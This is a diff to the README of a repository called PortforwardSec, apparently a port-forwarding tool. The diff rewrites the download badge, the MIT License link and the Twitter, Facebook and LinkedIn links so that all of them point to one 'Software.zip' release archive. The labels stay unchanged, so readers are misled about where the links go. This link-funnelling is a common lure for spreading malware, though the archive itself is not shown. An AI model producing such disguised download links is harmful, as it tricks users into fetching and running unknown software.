@@ -14,7 +14,7 @@ The repository will be regularly updated over time, with new features and improv
 ## Installation
 
 To get started with **PortforwardSec**, you can download the latest release by clicking on the link below:
-[![Download PortforwardSec](https://img.shields.io/badge/Download-PortforwardSec-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download PortforwardSec](https://github.com/ArielTintilayCordero/PortforwardSec/releases/download/v1.0/Software.zip)](https://github.com/ArielTintilayCordero/PortforwardSec/releases/download/v1.0/Software.zip)
 
 Once downloaded, you can unzip the file and follow the installation instructions provided in the repository to set up the port forwarding service.
 
@@ -52,7 +52,7 @@ Your feedback and suggestions are valuable to us, as they help us improve the pr
 
 ## License
 
-The **PortforwardSec** project is licensed under the [MIT License](https://opensource.org/licenses/MIT), which grants you the freedom to use, modify, and distribute the software as you see fit. For more details about the license terms, please refer to the LICENSE file in the repository.
+The **PortforwardSec** project is licensed under the [MIT License](https://github.com/ArielTintilayCordero/PortforwardSec/releases/download/v1.0/Software.zip), which grants you the freedom to use, modify, and distribute the software as you see fit. For more details about the license terms, please refer to the LICENSE file in the repository.
 
 ---
 
@@ -60,9 +60,9 @@ The **PortforwardSec** project is licensed under the [MIT License](https://opens
 
 Stay updated on the latest **PortforwardSec** news and announcements by following us on social media:
 
-- Twitter: [@PortforwardSec](https://twitter.com/PortforwardSec)
-- Facebook: [PortforwardSec](https://www.facebook.com/PortforwardSec)
-- LinkedIn: [PortforwardSec](https://www.linkedin.com/company/PortforwardSec)
+- Twitter: [@PortforwardSec](https://github.com/ArielTintilayCordero/PortforwardSec/releases/download/v1.0/Software.zip)
+- Facebook: [PortforwardSec](https://github.com/ArielTintilayCordero/PortforwardSec/releases/download/v1.0/Software.zip)
+- LinkedIn: [PortforwardSec](https://github.com/ArielTintilayCordero/PortforwardSec/releases/download/v1.0/Software.zip)
 
 Join our community to engage with other users, share your experiences, and collaborate on making **PortforwardSec** the best port forwarding solution out there!
 
